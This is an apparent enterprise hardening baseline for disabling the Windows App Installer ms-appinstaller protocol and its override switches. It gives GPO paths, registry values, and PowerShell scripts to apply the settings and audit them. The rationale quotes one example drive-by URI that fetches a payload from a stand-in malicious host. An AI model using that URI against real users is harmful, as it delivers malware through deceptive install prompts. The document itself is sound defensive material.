# [REQ-END-199] Administrative Templates: App Installer Protocol and Execution Controls

## Target Scope
* **Applicable Systems**: Tier 2 client workstations and member servers. *(For Tier 0 Privileged Access Workstations, refer to tightened baseline [REQ-PAW-188](../../07-paws/admin-templates/configure-paw-at-app-installer-controls.md)).*
* **Operating Systems**: Windows 10 (1709 and above) Enterprise/Professional, Windows 11 Enterprise/Pro, Windows Server 2019, 2022, and 2025.

---

## Implementation Details
* **Priority**: High
* **GPO Paths / Registry Locations**:
  * **Disable App Installer ms-appinstaller Protocol**:
    * GPO Path: `Computer Configuration\Policies\Administrative Templates\Windows Components\App Installer\Enable App Installer ms-appinstaller protocol` -> **Disabled**
    * Registry Path: `HKLM\SOFTWARE\Policies\Microsoft\Windows\AppInstaller`
    * Value Name: `EnableMSAppInstallerProtocol`
    * Value Type: `REG_DWORD`
    * Value Data: `0` (Disabled)
  * **Disable App Installer Experimental Features**:
    * GPO Path: `Computer Configuration\Policies\Administrative Templates\Windows Components\App Installer\Enable App Installer Experimental Features` -> **Disabled**
    * Registry Path: `HKLM\SOFTWARE\Policies\Microsoft\Windows\AppInstaller`
    * Value Name: `EnableExperimentalFeatures`
    * Value Type: `REG_DWORD`
    * Value Data: `0` (Disabled)
  * **Disable App Installer Hash Override**:
    * GPO Path: `Computer Configuration\Policies\Administrative Templates\Windows Components\App Installer\Enable App Installer Hash Override` -> **Disabled**
    * Registry Path: `HKLM\SOFTWARE\Policies\Microsoft\Windows\AppInstaller`
    * Value Name: `EnableHashOverride`
    * Value Type: `REG_DWORD`
    * Value Data: `0` (Disabled)
  * **Disable Local Archive Malware Scan Override**:
    * GPO Path: `Computer Configuration\Policies\Administrative Templates\Windows Components\App Installer\Enable App Installer Local Archive Malware Scan Override` -> **Disabled**
    * Registry Path: `HKLM\SOFTWARE\Policies\Microsoft\Windows\AppInstaller`
    * Value Name: `EnableLocalArchiveMalwareScanOverride`
    * Value Type: `REG_DWORD`
    * Value Data: `0` (Disabled)
  * **Enforce Microsoft Store Certificate Pinning**:
    * GPO Path: `Computer Configuration\Policies\Administrative Templates\Windows Components\App Installer\Enable App Installer Microsoft Store Source Certificate Validation Bypass` -> **Disabled**
    * Registry Path: `HKLM\SOFTWARE\Policies\Microsoft\Windows\AppInstaller`
    * Value Name: `EnableBypassCertificatePinningForMicrosoftStore`
    * Value Type: `REG_DWORD`
    * Value Data: `0` (Disabled / Bypass disallowed)

---

## Rationale
The Windows App Installer (`AppInstaller.exe`) provides deployment capabilities for MSIX, AppX, and `.appinstaller` manifest packages. In default client configurations, App Installer registers the `ms-appinstaller://` uniform resource identifier (URI) scheme, allowing web pages to directly trigger package installation.

### 1. The `ms-appinstaller://` Drive-By Exploitation Vector
Sophisticated cybercrime groups (including FIN7, Storm-0569, Sangria Tempest, and BlackCat/ALPHV ransomware affiliates) have extensively abused the App Installer URI protocol in malvertising campaigns:
* **One-Click Drive-By Execution**: Attackers purchase search engine advertisements impersonating legitimate enterprise utilities (such as Zoom, Microsoft Teams, AnyDesk, VLC, or KeePass). When an unsuspecting user clicks the sponsored result, the website invokes `ms-appinstaller:?source=https://malicious.example/payload.appinstaller`.
* **Mark of the Web (MotW) and SmartScreen Evasion**: The App Installer executable handles the package download out-of-process, historically bypassing browser download warnings, Mark of the Web (Zone.Identifier) stream assignment, and perimeter inspection engines. The user is presented with a deceptive Microsoft-branded installation dialog that conceals malicious script execution.
* **Disabling the Protocol Handler**: Setting `EnableMSAppInstallerProtocol = 0` completely unbinds the URI handler. Web browsers cannot launch App Installer directly, shutting down this prominent initial compromise conduit (referenced in Microsoft Security Advisories for CVE-2021-43890).

### 2. Eliminating Security Overrides and Tampering Conduits
App Installer features administrative override switches intended for developer debugging that must be prohibited in enterprise production:
* **Hash Integrity Enforcement (`EnableHashOverride = 0`)**: Prevents the execution of package bundles whose cryptographic hashes do not match manifest declarations, neutralizing transit tampering and rogue package substitutions.
* **Mandatory Antimalware Inspection (`EnableLocalArchiveMalwareScanOverride = 0`)**: Forces App Installer to route all local archives through the Antimalware Scan Interface (AMSI) and Microsoft Defender Antivirus before extraction.
* **Certificate Pinning Validation (`EnableBypassCertificatePinningForMicrosoftStore = 0`)**: Enforces strict certificate pinning for Microsoft Store package endpoints, thwarting adversary-in-the-middle decryption proxies and rogue root CA installations.
* **Disabling Experimental Features (`EnableExperimentalFeatures = 0`)**: Closes unvetted experimental code paths within the installer binary.

### 3. MITRE ATT&CK Mapping
* **T1218 - System Binary Proxy Execution**: Weaponizing `AppInstaller.exe` to bypass application control and proxy payload delivery.
* **T1566.002 - Phishing: Spearphishing Link**: Enticing users to invoke `ms-appinstaller://` URIs from phishing messages or malvertising.
* **T1204.001 - User Execution: Malicious Link**: Coercing users into initiating single-click package installations.
* **T1553.005 - Subvert Trust Controls: Treat As Untrusted**: Enforcing cryptographic signature, hash integrity, and certificate pinning validation.

---

## Legacy Impact & Compatibility
* **Enterprise Software Distribution**: Centrally managed application deployment frameworks (such as Microsoft Intune, Microsoft Endpoint Configuration Manager / MECM, winget CLI, and enterprise Group Policy Software Installation) do not depend on the `ms-appinstaller://` browser URI handler. Enterprise packages deployed via command line or system agents install without impediment.
* **Web-Based Package Links**: End users will no longer be able to install MSIX applications directly from internet hyperlinks in Chrome, Edge, or Firefox. Software packages must be downloaded locally and verified through approved organizational distribution channels.

---

## Implementation Steps

### Option A: Group Policy Object (GPO) Configuration (Preferred)

1. Open the **Group Policy Management Console** (`gpmc.msc`).
2. Edit or create the target GPO linked to workstations and member servers (e.g., `GPO_Hardening_Endpoints`).
3. Configure the following policies:

* Navigate to: `Computer Configuration\Policies\Administrative Templates\Windows Components\App Installer`
  * **Enable App Installer ms-appinstaller protocol**: Set to `Disabled`
  * **Enable App Installer Experimental Features**: Set to `Disabled`
  * **Enable App Installer Hash Override**: Set to `Disabled`
  * **Enable App Installer Local Archive Malware Scan Override**: Set to `Disabled`
  * **Enable App Installer Microsoft Store Source Certificate Validation Bypass**: Set to `Disabled`

4. Link the GPO to the appropriate Organizational Unit and verify policy enforcement using `gpupdate /force`.

---

### Option B: PowerShell & Registry Configuration (Remediation / Non-GPO)

Run the following script locally to configure the administrative template registry values:

[Download Script: Configure-EndAtAppInstallerControls.ps1](../implementation_scripts/Configure-EndAtAppInstallerControls.ps1)

```powershell
#Configure-EndAtAppInstallerControls.ps1
# Description: Configures Administrative Templates: App Installer Protocol and Execution Controls.

Write-Host "Configuring Administrative Templates: App Installer Protocol and Execution Controls..." -ForegroundColor Cyan

if (-not (Test-Path -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppInstaller")) {
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppInstaller" -Force | Out-Null
}
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppInstaller" -Name "EnableExperimentalFeatures" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppInstaller" -Name "EnableHashOverride" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppInstaller" -Name "EnableLocalArchiveMalwareScanOverride" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppInstaller" -Name "EnableBypassCertificatePinningForMicrosoftStore" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppInstaller" -Name "EnableMSAppInstallerProtocol" -Value 0 -Type DWord -Force

Write-Host "[+] Administrative Templates: App Installer Protocol and Execution Controls applied successfully." -ForegroundColor Green
```

*To verify the configuration:*

[Download Script: Get-EndAtAppInstallerControlsStatus.ps1](../audit_scripts/Get-EndAtAppInstallerControlsStatus.ps1)

```powershell
#Get-EndAtAppInstallerControlsStatus.ps1
# Description: Audits Administrative Templates: App Installer Protocol and Execution Controls.

Write-Host "--- Auditing Administrative Templates: App Installer Protocol and Execution Controls ---" -ForegroundColor Cyan
$script:Vulnerable = $false

$TargetKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppInstaller"
$ValueName = "EnableExperimentalFeatures"
$ExpectedValue = 0
if (Test-Path -Path $TargetKey) {
    $Prop = Get-ItemProperty -Path $TargetKey -Name $ValueName -ErrorAction SilentlyContinue
    if ($null -ne $Prop) {
        $Actual = $Prop.$ValueName
        if ($Actual -eq $ExpectedValue) {
            Write-Host "  [+] $ValueName = $($Actual) (Secure)" -ForegroundColor Green
        } else {
            Write-Host "  [!] MISMATCH: $ValueName = $($Actual) (Expected: $($ExpectedValue))" -ForegroundColor Red
            $script:Vulnerable = $true
        }
    } else {
        Write-Host "  [!] MISSING VALUE: $ValueName (Expected: $($ExpectedValue))" -ForegroundColor Red
        $script:Vulnerable = $true
    }
} else {
    Write-Host "  [!] MISSING KEY: $TargetKey" -ForegroundColor Red
    $script:Vulnerable = $true
}

$TargetKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppInstaller"
$ValueName = "EnableHashOverride"
$ExpectedValue = 0
if (Test-Path -Path $TargetKey) {
    $Prop = Get-ItemProperty -Path $TargetKey -Name $ValueName -ErrorAction SilentlyContinue
    if ($null -ne $Prop) {
        $Actual = $Prop.$ValueName
        if ($Actual -eq $ExpectedValue) {
            Write-Host "  [+] $ValueName = $($Actual) (Secure)" -ForegroundColor Green
        } else {
            Write-Host "  [!] MISMATCH: $ValueName = $($Actual) (Expected: $($ExpectedValue))" -ForegroundColor Red
            $script:Vulnerable = $true
        }
    } else {
        Write-Host "  [!] MISSING VALUE: $ValueName (Expected: $($ExpectedValue))" -ForegroundColor Red
        $script:Vulnerable = $true
    }
} else {
    Write-Host "  [!] MISSING KEY: $TargetKey" -ForegroundColor Red
    $script:Vulnerable = $true
}

$TargetKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppInstaller"
$ValueName = "EnableLocalArchiveMalwareScanOverride"
$ExpectedValue = 0
if (Test-Path -Path $TargetKey) {
    $Prop = Get-ItemProperty -Path $TargetKey -Name $ValueName -ErrorAction SilentlyContinue
    if ($null -ne $Prop) {
        $Actual = $Prop.$ValueName
        if ($Actual -eq $ExpectedValue) {
            Write-Host "  [+] $ValueName = $($Actual) (Secure)" -ForegroundColor Green
        } else {
            Write-Host "  [!] MISMATCH: $ValueName = $($Actual) (Expected: $($ExpectedValue))" -ForegroundColor Red
            $script:Vulnerable = $true
        }
    } else {
        Write-Host "  [!] MISSING VALUE: $ValueName (Expected: $($ExpectedValue))" -ForegroundColor Red
        $script:Vulnerable = $true
    }
} else {
    Write-Host "  [!] MISSING KEY: $TargetKey" -ForegroundColor Red
    $script:Vulnerable = $true
}

$TargetKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppInstaller"
$ValueName = "EnableBypassCertificatePinningForMicrosoftStore"
$ExpectedValue = 0
if (Test-Path -Path $TargetKey) {
    $Prop = Get-ItemProperty -Path $TargetKey -Name $ValueName -ErrorAction SilentlyContinue
    if ($null -ne $Prop) {
        $Actual = $Prop.$ValueName
        if ($Actual -eq $ExpectedValue) {
            Write-Host "  [+] $ValueName = $($Actual) (Secure)" -ForegroundColor Green
        } else {
            Write-Host "  [!] MISMATCH: $ValueName = $($Actual) (Expected: $($ExpectedValue))" -ForegroundColor Red
            $script:Vulnerable = $true
        }
    } else {
        Write-Host "  [!] MISSING VALUE: $ValueName (Expected: $($ExpectedValue))" -ForegroundColor Red
        $script:Vulnerable = $true
    }
} else {
    Write-Host "  [!] MISSING KEY: $TargetKey" -ForegroundColor Red
    $script:Vulnerable = $true
}

$TargetKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppInstaller"
$ValueName = "EnableMSAppInstallerProtocol"
$ExpectedValue = 0
if (Test-Path -Path $TargetKey) {
    $Prop = Get-ItemProperty -Path $TargetKey -Name $ValueName -ErrorAction SilentlyContinue
    if ($null -ne $Prop) {
        $Actual = $Prop.$ValueName
        if ($Actual -eq $ExpectedValue) {
            Write-Host "  [+] $ValueName = $($Actual) (Secure)" -ForegroundColor Green
        } else {
            Write-Host "  [!] MISMATCH: $ValueName = $($Actual) (Expected: $($ExpectedValue))" -ForegroundColor Red
            $script:Vulnerable = $true
        }
    } else {
        Write-Host "  [!] MISSING VALUE: $ValueName (Expected: $($ExpectedValue))" -ForegroundColor Red
        $script:Vulnerable = $true
    }
} else {
    Write-Host "  [!] MISSING KEY: $TargetKey" -ForegroundColor Red
    $script:Vulnerable = $true
}

if ($script:Vulnerable) {
    Write-Host "Audit Result: VULNERABLE" -ForegroundColor Red
    exit 1
} else {
    Write-Host "Audit Result: SECURE" -ForegroundColor Green
    exit 0
}
```

---

## Sources & Compliance References
* **CIS Benchmark**: CIS Microsoft Windows 10 Enterprise Benchmark: Section 18.10.18.2, 18.10.18.3, 18.10.18.4, 18.10.18.5, 18.10.18.6; CIS Microsoft Windows 11 Enterprise Benchmark: Section 18.10.18.2, 18.10.18.3, 18.10.18.4, 18.10.18.5, 18.10.18.6
* **DISA STIG**: Windows 10 STIG Rule WN10-CC-000340, Windows 11 STIG Rule WN11-CC-000340
* **Microsoft Security Advisory**: Disabling the MSIX ms-appinstaller protocol scheme (CVE-2021-43890 / Microsoft Security Response Center)
* **ANSSI Active Directory Hardening Guide**: Section 3.3 (Application execution and untrusted binary restrictions)
